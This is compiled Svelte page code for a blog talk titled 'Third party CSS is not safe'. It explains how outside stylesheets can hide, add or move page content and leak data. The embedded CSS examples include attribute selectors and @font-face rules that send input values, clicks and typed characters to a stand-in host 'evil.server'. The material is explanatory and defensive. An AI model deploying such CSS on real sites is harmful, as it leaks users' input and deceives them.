	let html_tag_1;

	let raw1_value = `<script type="application/ld+json">${JSON.stringify({
		"@context": "https://schema.org",
		"@type": "BreadcrumbList",
		"description": "Breadcrumbs list",
		"name": "Breadcrumbs",
		"itemListElement": [
			{
				"@type": "ListItem",
				"item": {
					"@id": "https://lihautan.com",
					"name": "Homepage"
				},
				"name": "Homepage",
				"position": 1
			},
			{
				"@type": "ListItem",
				"item": {
					"@id": "https%3A%2F%2Flihautan.com%2Fthird-party-css-is-not-safe",
					"name": /*title*/ ctx[0]
				},
				"name": /*title*/ ctx[0],
				"position": 2
			}
		]
	})}</script>` + "";

	let html_anchor_1;
	let t0;
	let a;
	let t1;
	let t2;
	let header;
	let t3;
	let main;
	let h1;
	let t4;
	let t5;
	let t6;
	let t7;
	let article;
	let t8;
	let footer;
	let newsletter;
	let t9;
	let carbonad;
	let current;
	document.title = title_value = "" + (/*title*/ ctx[0] + " | Tan Li Hau");
	let each_value_1 = /*tags*/ ctx[2];
	let each_blocks_1 = [];

	for (let i = 0; i < each_value_1.length; i += 1) {
		each_blocks_1[i] = create_each_block_1(get_each_context_1(ctx, each_value_1, i));
	}

	header = new Header({});
	let each_value = /*tags*/ ctx[2];
	let each_blocks = [];

	for (let i = 0; i < each_value.length; i += 1) {
		each_blocks[i] = create_each_block(get_each_context(ctx, each_value, i));
	}

	let if_block = (/*occasion*/ ctx[3] && /*occasionLink*/ ctx[4] || /*videoLink*/ ctx[5]) && create_if_block(ctx);
	const default_slot_template = /*$$slots*/ ctx[8].default;
	const default_slot = create_slot(default_slot_template, ctx, /*$$scope*/ ctx[7], null);
	newsletter = new Newsletter({});
	carbonad = new CarbonAd({});

	return {
		c() {
			meta0 = element("meta");
			meta1 = element("meta");
			meta2 = element("meta");
			meta3 = element("meta");
			meta4 = element("meta");
			meta5 = element("meta");
			meta6 = element("meta");
			meta7 = element("meta");
			meta8 = element("meta");
			meta9 = element("meta");
			meta10 = element("meta");

			for (let i = 0; i < each_blocks_1.length; i += 1) {
				each_blocks_1[i].c();
			}

			meta11 = element("meta");
			meta12 = element("meta");
			html_anchor = empty();
			html_anchor_1 = empty();
			t0 = space();
			a = element("a");
			t1 = text("Skip to content");
			t2 = space();
			create_component(header.$$.fragment);
			t3 = space();
			main = element("main");
			h1 = element("h1");
			t4 = text(/*title*/ ctx[0]);
			t5 = space();

			for (let i = 0; i < each_blocks.length; i += 1) {
				each_blocks[i].c();
			}

			t6 = space();
			if (if_block) if_block.c();
			t7 = space();
			article = element("article");
			if (default_slot) default_slot.c();
			t8 = space();
			footer = element("footer");
			create_component(newsletter.$$.fragment);
			t9 = space();
			create_component(carbonad.$$.fragment);
			this.h();
		},
		l(nodes) {
			const head_nodes = query_selector_all("[data-svelte=\"svelte-15e3uyc\"]", document.head);
			meta0 = claim_element(head_nodes, "META", { name: true, content: true });
			meta1 = claim_element(head_nodes, "META", { name: true, content: true });
			meta2 = claim_element(head_nodes, "META", { name: true, content: true });
			meta3 = claim_element(head_nodes, "META", { name: true, content: true });
			meta4 = claim_element(head_nodes, "META", { name: true, content: true });
			meta5 = claim_element(head_nodes, "META", { name: true, content: true });
			meta6 = claim_element(head_nodes, "META", { name: true, content: true });
			meta7 = claim_element(head_nodes, "META", { name: true, content: true });
			meta8 = claim_element(head_nodes, "META", { name: true, content: true });
			meta9 = claim_element(head_nodes, "META", { name: true, content: true });
			meta10 = claim_element(head_nodes, "META", { name: true, content: true });

			for (let i = 0; i < each_blocks_1.length; i += 1) {
				each_blocks_1[i].l(head_nodes);
			}

			meta11 = claim_element(head_nodes, "META", { itemprop: true, content: true });
			meta12 = claim_element(head_nodes, "META", { itemprop: true, content: true });
			html_anchor = empty();
			html_anchor_1 = empty();
			head_nodes.forEach(detach);
			t0 = claim_space(nodes);
			a = claim_element(nodes, "A", { href: true, class: true });
			var a_nodes = children(a);
			t1 = claim_text(a_nodes, "Skip to content");
			a_nodes.forEach(detach);
			t2 = claim_space(nodes);
			claim_component(header.$$.fragment, nodes);
			t3 = claim_space(nodes);
			main = claim_element(nodes, "MAIN", { id: true, class: true });
			var main_nodes = children(main);
			h1 = claim_element(main_nodes, "H1", {});
			var h1_nodes = children(h1);
			t4 = claim_text(h1_nodes, /*title*/ ctx[0]);
			h1_nodes.forEach(detach);
			t5 = claim_space(main_nodes);

			for (let i = 0; i < each_blocks.length; i += 1) {
				each_blocks[i].l(main_nodes);
			}

			t6 = claim_space(main_nodes);
			if (if_block) if_block.l(main_nodes);
			t7 = claim_space(main_nodes);
			article = claim_element(main_nodes, "ARTICLE", {});
			var article_nodes = children(article);
			if (default_slot) default_slot.l(article_nodes);
			article_nodes.forEach(detach);
			main_nodes.forEach(detach);
			t8 = claim_space(nodes);
			footer = claim_element(nodes, "FOOTER", { class: true });
			var footer_nodes = children(footer);
			claim_component(newsletter.$$.fragment, footer_nodes);
			t9 = claim_space(footer_nodes);
			claim_component(carbonad.$$.fragment, footer_nodes);
			footer_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(meta0, "name", "description");
			attr(meta0, "content", /*description*/ ctx[1]);
			attr(meta1, "name", "image");
			attr(meta1, "content", image);
			attr(meta2, "name", "og:image");
			attr(meta2, "content", image);
			attr(meta3, "name", "og:title");
			attr(meta3, "content", /*title*/ ctx[0]);
			attr(meta4, "name", "og:description");
			attr(meta4, "content", /*description*/ ctx[1]);
			attr(meta5, "name", "og:type");
			attr(meta5, "content", "website");
			attr(meta6, "name", "twitter:card");
			attr(meta6, "content", "summary_large_image");
			attr(meta7, "name", "twitter:creator");
			attr(meta7, "content", "@lihautan");
			attr(meta8, "name", "twitter:title");
			attr(meta8, "content", /*title*/ ctx[0]);
			attr(meta9, "name", "twitter:description");
			attr(meta9, "content", /*description*/ ctx[1]);
			attr(meta10, "name", "twitter:image");
			attr(meta10, "content", image);
			attr(meta11, "itemprop", "url");
			attr(meta11, "content", "https%3A%2F%2Flihautan.com%2Fthird-party-css-is-not-safe");
			attr(meta12, "itemprop", "image");
			attr(meta12, "content", image);
			html_tag = new HtmlTag(html_anchor);
			html_tag_1 = new HtmlTag(html_anchor_1);
			attr(a, "href", "#content");
			attr(a, "class", "skip svelte-hvyckn");
			attr(main, "id", "content");
			attr(main, "class", "blog svelte-hvyckn");
			attr(footer, "class", "svelte-hvyckn");
		},
		m(target, anchor) {
			append(document.head, meta0);
			append(document.head, meta1);
			append(document.head, meta2);
			append(document.head, meta3);
			append(document.head, meta4);
			append(document.head, meta5);
			append(document.head, meta6);
			append(document.head, meta7);
			append(document.head, meta8);
			append(document.head, meta9);
			append(document.head, meta10);

			for (let i = 0; i < each_blocks_1.length; i += 1) {
				each_blocks_1[i].m(document.head, null);
			}

			append(document.head, meta11);
			append(document.head, meta12);
			html_tag.m(raw0_value, document.head);
			append(document.head, html_anchor);
			html_tag_1.m(raw1_value, document.head);
			append(document.head, html_anchor_1);
			insert(target, t0, anchor);
			insert(target, a, anchor);
			append(a, t1);
			insert(target, t2, anchor);
			mount_component(header, target, anchor);
			insert(target, t3, anchor);
			insert(target, main, anchor);
			append(main, h1);
			append(h1, t4);
			append(main, t5);

			for (let i = 0; i < each_blocks.length; i += 1) {
				each_blocks[i].m(main, null);
			}

			append(main, t6);
			if (if_block) if_block.m(main, null);
			append(main, t7);
			append(main, article);

			if (default_slot) {
				default_slot.m(article, null);
			}

			insert(target, t8, anchor);
			insert(target, footer, anchor);
			mount_component(newsletter, footer, null);
			append(footer, t9);
			mount_component(carbonad, footer, null);
			current = true;
		},
		p(ctx, [dirty]) {
			if ((!current || dirty & /*title*/ 1) && title_value !== (title_value = "" + (/*title*/ ctx[0] + " | Tan Li Hau"))) {
				document.title = title_value;
			}

			if (!current || dirty & /*description*/ 2) {
				attr(meta0, "content", /*description*/ ctx[1]);
			}

			if (!current || dirty & /*title*/ 1) {
				attr(meta3, "content", /*title*/ ctx[0]);
			}

			if (!current || dirty & /*description*/ 2) {
				attr(meta4, "content", /*description*/ ctx[1]);
			}

			if (!current || dirty & /*title*/ 1) {
				attr(meta8, "content", /*title*/ ctx[0]);
			}

			if (!current || dirty & /*description*/ 2) {
				attr(meta9, "content", /*description*/ ctx[1]);
			}

			if (dirty & /*tags*/ 4) {
				each_value_1 = /*tags*/ ctx[2];
				let i;

				for (i = 0; i < each_value_1.length; i += 1) {
					const child_ctx = get_each_context_1(ctx, each_value_1, i);

					if (each_blocks_1[i]) {
						each_blocks_1[i].p(child_ctx, dirty);
					} else {
						each_blocks_1[i] = create_each_block_1(child_ctx);
						each_blocks_1[i].c();
						each_blocks_1[i].m(meta11.parentNode, meta11);
					}
				}

				for (; i < each_blocks_1.length; i += 1) {
					each_blocks_1[i].d(1);
				}

				each_blocks_1.length = each_value_1.length;
			}

			if ((!current || dirty & /*description, title*/ 3) && raw0_value !== (raw0_value = `<script type="application/ld+json">${JSON.stringify({
				"@context": "https://schema.org",
				"@type": "Article",
				author: /*jsonLdAuthor*/ ctx[6],
				copyrightHolder: /*jsonLdAuthor*/ ctx[6],
				copyrightYear: "2020",
				creator: /*jsonLdAuthor*/ ctx[6],
				publisher: /*jsonLdAuthor*/ ctx[6],
				description: /*description*/ ctx[1],
				headline: /*title*/ ctx[0],
				name: /*title*/ ctx[0],
				inLanguage: "en"
			})}</script>` + "")) html_tag.p(raw0_value);

			if ((!current || dirty & /*title*/ 1) && raw1_value !== (raw1_value = `<script type="application/ld+json">${JSON.stringify({
				"@context": "https://schema.org",
				"@type": "BreadcrumbList",
				"description": "Breadcrumbs list",
				"name": "Breadcrumbs",
				"itemListElement": [
					{
						"@type": "ListItem",
						"item": {
							"@id": "https://lihautan.com",
							"name": "Homepage"
						},
						"name": "Homepage",
						"position": 1
					},
					{
						"@type": "ListItem",
						"item": {
							"@id": "https%3A%2F%2Flihautan.com%2Fthird-party-css-is-not-safe",
							"name": /*title*/ ctx[0]
						},
						"name": /*title*/ ctx[0],
						"position": 2
					}
				]
			})}</script>` + "")) html_tag_1.p(raw1_value);

			if (!current || dirty & /*title*/ 1) set_data(t4, /*title*/ ctx[0]);

			if (dirty & /*tags*/ 4) {
				each_value = /*tags*/ ctx[2];
				let i;

				for (i = 0; i < each_value.length; i += 1) {
					const child_ctx = get_each_context(ctx, each_value, i);

					if (each_blocks[i]) {
						each_blocks[i].p(child_ctx, dirty);
					} else {
						each_blocks[i] = create_each_block(child_ctx);
						each_blocks[i].c();
						each_blocks[i].m(main, t6);
					}
				}

				for (; i < each_blocks.length; i += 1) {
					each_blocks[i].d(1);
				}

				each_blocks.length = each_value.length;
			}

			if (/*occasion*/ ctx[3] && /*occasionLink*/ ctx[4] || /*videoLink*/ ctx[5]) {
				if (if_block) {
					if_block.p(ctx, dirty);
				} else {
					if_block = create_if_block(ctx);
					if_block.c();
					if_block.m(main, t7);
				}
			} else if (if_block) {
				if_block.d(1);
				if_block = null;
			}

			if (default_slot) {
				if (default_slot.p && dirty & /*$$scope*/ 128) {
					update_slot(default_slot, default_slot_template, ctx, /*$$scope*/ ctx[7], dirty, null, null);
				}
			}
		},
		i(local) {
			if (current) return;
			transition_in(header.$$.fragment, local);
			transition_in(default_slot, local);
			transition_in(newsletter.$$.fragment, local);
			transition_in(carbonad.$$.fragment, local);
			current = true;
		},
		o(local) {
			transition_out(header.$$.fragment, local);
			transition_out(default_slot, local);
			transition_out(newsletter.$$.fragment, local);
			transition_out(carbonad.$$.fragment, local);
			current = false;
		},
		d(detaching) {
			detach(meta0);
			detach(meta1);
			detach(meta2);
			detach(meta3);
			detach(meta4);
			detach(meta5);
			detach(meta6);
			detach(meta7);
			detach(meta8);
			detach(meta9);
			detach(meta10);
			destroy_each(each_blocks_1, detaching);
			detach(meta11);
			detach(meta12);
			detach(html_anchor);
			if (detaching) html_tag.d();
			detach(html_anchor_1);
			if (detaching) html_tag_1.d();
			if (detaching) detach(t0);
			if (detaching) detach(a);
			if (detaching) detach(t2);
			destroy_component(header, detaching);
			if (detaching) detach(t3);
			if (detaching) detach(main);
			destroy_each(each_blocks, detaching);
			if (if_block) if_block.d();
			if (default_slot) default_slot.d(detaching);
			if (detaching) detach(t8);
			if (detaching) detach(footer);
			destroy_component(newsletter);
			destroy_component(carbonad);
		}
	};
}

function instance$2($$self, $$props, $$invalidate) {
	let { title = "" } = $$props;
	let { description = "" } = $$props;
	let { tags = [] } = $$props;
	let { occasion } = $$props;
	let { occasionLink } = $$props;
	let { videoLink } = $$props;
	const jsonLdAuthor = { ["@type"]: "Person", name: "Tan Li Hau" };
	let { $$slots = {}, $$scope } = $$props;

	$$self.$set = $$props => {
		if ("title" in $$props) $$invalidate(0, title = $$props.title);
		if ("description" in $$props) $$invalidate(1, description = $$props.description);
		if ("tags" in $$props) $$invalidate(2, tags = $$props.tags);
		if ("occasion" in $$props) $$invalidate(3, occasion = $$props.occasion);
		if ("occasionLink" in $$props) $$invalidate(4, occasionLink = $$props.occasionLink);
		if ("videoLink" in $$props) $$invalidate(5, videoLink = $$props.videoLink);
		if ("$$scope" in $$props) $$invalidate(7, $$scope = $$props.$$scope);
	};

	return [
		title,
		description,
		tags,
		occasion,
		occasionLink,
		videoLink,
		jsonLdAuthor,
		$$scope,
		$$slots
	];
}

class Talk extends SvelteComponent {
	constructor(options) {
		super();

		init(this, options, instance$2, create_fragment$2, safe_not_equal, {
			title: 0,
			description: 1,
			tags: 2,
			occasion: 3,
			occasionLink: 4,
			videoLink: 5
		});
	}
}

/* content/talk/third-party-css-is-not-safe/@@page-markup.svelte generated by Svelte v3.24.0 */

function create_default_slot(ctx) {
	let section0;
	let ul2;
	let li0;
	let a0;
	let t0;
	let li1;
	let a1;
	let t1;
	let ul0;
	let li2;
	let a2;
	let t2;
	let li3;
	let a3;
	let t3;
	let li4;
	let a4;
	let t4;
	let li5;
	let a5;
	let t5;
	let ul1;
	let li6;
	let a6;
	let t6;
	let li7;
	let a7;
	let t7;
	let li8;
	let a8;
	let t8;
	let li9;
	let a9;
	let t9;
	let li10;
	let a10;
	let t10;
	let li11;
	let a11;
	let t11;
	let li12;
	let a12;
	let t12;
	let li13;
	let a13;
	let t13;
	let li14;
	let a14;
	let t14;
	let t15;
	let p0;
	let t16;
	let a15;
	let t17;
	let t18;
	let t19;
	let section1;
	let h20;
	let a16;
	let t20;
	let t21;
	let p1;
	let t22;
	let t23;
	let p2;
	let t24;
	let t25;
	let p3;
	let t26;
	let t27;
	let section2;
	let h21;
	let a17;
	let t28;
	let t29;
	let p4;
	let t30;
	let t31;
	let section3;
	let h30;
	let a18;
	let t32;
	let t33;
	let p5;
	let t34;
	let t35;
	let p6;
	let picture0;
	let source0;
	let source1;
	let img0;
	let t36;
	let p7;
	let t37;
	let t38;
	let p8;
	let em0;
	let t39;
	let code0;
	let t40;
	let t41;
	let t42;
	let section4;
	let h31;
	let a19;
	let t43;
	let t44;
	let p9;
	let t45;
	let t46;
	let p10;
	let t47;
	let t48;
	let p11;
	let t49;
	let strong0;
	let t50;
	let t51;
	let em1;
	let t52;
	let t53;
	let t54;
	let p12;
	let t55;
	let a20;
	let t56;
	let t57;
	let t58;
	let p13;
	let picture1;
	let source2;
	let source3;
	let img1;
	let t59;
	let p14;
	let strong1;
	let t60;
	let t61;
	let em2;
	let t62;
	let t63;
	let t64;
	let section5;
	let h32;
	let a21;
	let t65;
	let t66;
	let p15;
	let t67;
	let t68;
	let p16;
	let picture2;
	let source4;
	let source5;
	let img2;
	let t69;
	let p17;
	let t70;
	let t71;
	let section6;
	let h22;
	let a22;
	let t72;
	let t73;
	let p18;
	let t74;
	let t75;
	let section7;
	let h33;
	let a23;
	let t76;
	let t77;
	let p19;
	let t78;
	let code1;
	let t79;
	let t80;
	let t81;
	let p20;
	let t82;
	let a24;
	let t83;
	let t84;
	let t85;
	let pre0;

	let raw0_value = `<code class="language-css"><span class="token selector">a.c-rsvp</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t86;
	let p21;
	let picture3;
	let source6;
	let source7;
	let img3;
	let t87;
	let section8;
	let h34;
	let a25;
	let t88;
	let t89;
	let p22;
	let t90;
	let t91;
	let p23;
	let t92;
	let code2;
	let t93;
	let t94;
	let t95;
	let pre1;

	let raw1_value = `<code class="language-css"><span class="token selector">.c-event__content</span> <span class="token punctuation">&#123;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://localhost/image.png<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
  <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>
  <span class="token property">background-size</span><span class="token punctuation">:</span> contain<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t96;
	let p24;
	let picture4;
	let source8;
	let source9;
	let img4;
	let t97;
	let p25;
	let t98;
	let code3;
	let t99;
	let t100;
	let code4;
	let t101;
	let t102;
	let code5;
	let t103;
	let t104;
	let t105;
	let p26;
	let t106;
	let t107;
	let pre2;

	let raw2_value = `<code class="language-css"><span class="token selector">a.c-rsvp::before</span> <span class="token punctuation">&#123;</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'Snap! Failed to fetch content.'</span><span class="token punctuation">;</span>
  <span class="token property">margin-right</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.c-rsvp span:first-child</span> <span class="token punctuation">&#123;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 106px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.c-rsvp span:first-child::after</span> <span class="token punctuation">&#123;</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'Refresh'</span><span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #fafaff<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 12px<span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t108;
	let p27;
	let t109;
	let strong2;
	let t110;
	let t111;
	let strong3;
	let t112;
	let t113;
	let t114;
	let p28;
	let picture5;
	let source10;
	let source11;
	let img5;
	let t115;
	let p29;
	let t116;
	let t117;
	let pre3;

	let raw3_value = `<code class="language-css"><span class="token selector">p.hotline_number</span> <span class="token punctuation">&#123;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">p.hotline_number::after</span> <span class="token punctuation">&#123;</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'(65) 87654321'</span><span class="token punctuation">;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #f5f5f5<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t118;
	let p30;
	let picture6;
	let source12;
	let source13;
	let img6;
	let t119;
	let blockquote;
	let p31;
	let t120;
	let t121;
	let section9;
	let h35;
	let a26;
	let t122;
	let t123;
	let p32;
	let t124;
	let t125;
	let pre4;

	let raw4_value = `<code class="language-css"><span class="token selector">.c-rsvp</span> <span class="token punctuation">&#123;</span>
  <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">z-index</span><span class="token punctuation">:</span> 1000<span class="token punctuation">;</span>
  <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
  <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.c-rsvp span:first-child</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
  <span class="token property">color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t126;
	let section10;
	let h36;
	let a27;
	let t127;
	let t128;
	let p33;
	let t129;
	let t130;
	let p34;
	let t131;
	let t132;
	let p35;
	let t133;
	let t134;
	let p36;
	let t135;
	let code6;
	let t136;
	let t137;
	let code7;
	let t138;
	let t139;
	let t140;
	let iframe;
	let iframe_src_value;
	let t141;
	let p37;
	let t142;
	let code8;
	let t143;
	let t144;
	let t145;
	let pre5;

	let raw5_value = `<code class="language-css"><span class="token selector">input[value$='a']</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?a'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">input[value$='b']</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?b'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">input[value$='c']</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?c'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">input[value$='d']</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/value?d'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t146;
	let section11;
	let h37;
	let a28;
	let t147;
	let t148;
	let p38;
	let t149;
	let t150;
	let pre6;

	let raw6_value = `<code class="language-css"><span class="token selector">a.c-rsvp:hover</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/hover'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">a.c-rsvp:active</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/click'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t151;
	let section12;
	let h38;
	let a29;
	let t152;
	let t153;
	let p39;
	let t154;
	let t155;
	let p40;
	let t156;
	let strong4;
	let t157;
	let t158;
	let t159;
	let p41;
	let t160;
	let code9;
	let t161;
	let t162;
	let t163;
	let p42;
	let t164;
	let t165;
	let pre7;

	let raw7_value = `<code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/key=A'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'woff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>'http://evil.server/key=B'<span class="token punctuation">)</span></span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'woff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+42<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">element</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> evil<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code>` + "";

	let t166;
	let p43;
	let t167;
	let code10;
	let t168;
	let t169;
	let code11;
	let t170;
	let t171;
	let t172;
	let section13;
	let h23;
	let a30;
	let t173;
	let t174;
	let p44;
	let t175;
	let code12;
	let t176;
	let t177;
	let t178;
	let p45;
	let picture7;
	let source14;
	let source15;
	let img7;
	let t179;
	let p46;
	let t180;
	let a31;
	let t181;
	let t182;
	let t183;
	let p47;
	let t184;
	let t185;
	let p48;
	let picture8;
	let source16;
	let source17;
	let img8;
	let t186;
	let p49;
	let t187;
	let t188;
	let pre8;

	let raw8_value = `<code class="language-">img-src &#39;self&#39; *.gstatic.com;
style-src &#39;self&#39;;</code>` + "";

	let t189;
	let p50;
	let t190;
	let code13;
	let t191;
	let t192;
	let t193;
	let p51;
	let t194;
	let t195;
	let section14;
	let h24;
	let a32;
	let t196;
	let t197;
	let p52;
	let t198;
	let t199;
	let section15;
	let h25;
	let a33;
	let t200;
	let t201;
	let ul3;
	let li15;
	let a34;
	let t202;
	let t203;
	let li16;
	let a35;
	let t204;
	let t205;
	let li17;
	let a36;
	let t206;
	let t207;
	let li18;
	let a37;
	let t208;
	let t209;
	let li19;
	let a38;
	let t210;

	return {
		c() {
			section0 = element("section");
			ul2 = element("ul");
			li0 = element("li");
			a0 = element("a");
			t0 = text("3rd party");
			li1 = element("li");
			a1 = element("a");
			t1 = text("Where does 3rd party CSS come from?");
			ul0 = element("ul");
			li2 = element("li");
			a2 = element("a");
			t2 = text("1. CSS Frameworks");
			li3 = element("li");
			a3 = element("a");
			t3 = text("2. Third party scripts");
			li4 = element("li");
			a4 = element("a");
			t4 = text("3. Browser extensions");
			li5 = element("li");
			a5 = element("a");
			t5 = text("How 3rd party CSS can be unsafe?");
			ul1 = element("ul");
			li6 = element("li");
			a6 = element("a");
			t6 = text("Disappearing content");
			li7 = element("li");
			a7 = element("a");
			t7 = text("Adding content");
			li8 = element("li");
			a8 = element("a");
			t8 = text("Moving content");
			li9 = element("li");
			a9 = element("a");
			t9 = text("Reading attributes");
			li10 = element("li");
			a10 = element("a");
			t10 = text("Monitoring attributes");
			li11 = element("li");
			a11 = element("a");
			t11 = text("Reading text");
			li12 = element("li");
			a12 = element("a");
			t12 = text("Content Security Policy");
			li13 = element("li");
			a13 = element("a");
			t13 = text("Summary");
			li14 = element("li");
			a14 = element("a");
			t14 = text("Further reading");
			t15 = space();
			p0 = element("p");
			t16 = text("Recently, I read ");
			a15 = element("a");
			t17 = text("Jake Archibald's \"Third party CSS is not safe\"");
			t18 = text(", and it has a lot to say about why 3rd party CSS is not safe. You should give it a read, but if you are lazy, here I am going to read it along with you.");
			t19 = space();
			section1 = element("section");
			h20 = element("h2");
			a16 = element("a");
			t20 = text("3rd party");
			t21 = space();
			p1 = element("p");
			t22 = text("If you use assets or APIs from sources that are not provided by yourself, you are using it from a 3rd party. Generally, in a context of a website, this means loading resources that is not from the same domain.");
			t23 = space();
			p2 = element("p");
			t24 = text("Jake then gave examples of how 3rd party images and 3rd party scripts could be harmful.");
			t25 = space();
			p3 = element("p");
			t26 = text("But, today's main focus is on 3rd party CSS. So let's scroll down and see what harm can 3rd party CSS bring.");
			t27 = space();
			section2 = element("section");
			h21 = element("h2");
			a17 = element("a");
			t28 = text("Where does 3rd party CSS come from?");
			t29 = space();
			p4 = element("p");
			t30 = text("Before we dive into what harm can it bring, let's pause for a moment and think, how does 3rd party CSS get into our web page?");
			t31 = space();
			section3 = element("section");
			h30 = element("h3");
			a18 = element("a");
			t32 = text("1. CSS Frameworks");
			t33 = space();
			p5 = element("p");
			t34 = text("Well, if you use frameworks like Bootstrap (I have nothing against using Bootstrap, it's a great CSS framework), one of the options to adding it to your website is to use one of their CDN links.");
			t35 = space();
			p6 = element("p");
			picture0 = element("picture");
			source0 = element("source");
			source1 = element("source");
			img0 = element("img");
			t36 = space();
			p7 = element("p");
			t37 = text("This means that you are going to trust the CSS content return from the Bootstrap CDN.");
			t38 = space();
			p8 = element("p");
			em0 = element("em");
			t39 = text("Have you ever take a look at what is contained in the ");
			code0 = element("code");
			t40 = text("bootstrap.min.css");
			t41 = text(" from CDN?");
			t42 = space();
			section4 = element("section");
			h31 = element("h3");
			a19 = element("a");
			t43 = text("2. Third party scripts");
			t44 = space();
			p9 = element("p");
			t45 = text("It's pretty lame for the 3rd party scripts to do something malicious through a 3rd party CSS, because the scope of influence of a 3rd party scripts is much more than a 3rd party CSS. But nonetheless, it's worth noting that it is entirely possible that a 3rd party CSS comes from a 3rd party script.");
			t46 = space();
			p10 = element("p");
			t47 = text("This begs the question of, where does the 3rd party script come from?");
			t48 = space();
			p11 = element("p");
			t49 = text("Well, if you visit any ");
			strong0 = element("strong");
			t50 = text("well-intentioned");
			t51 = space();
			em1 = element("em");
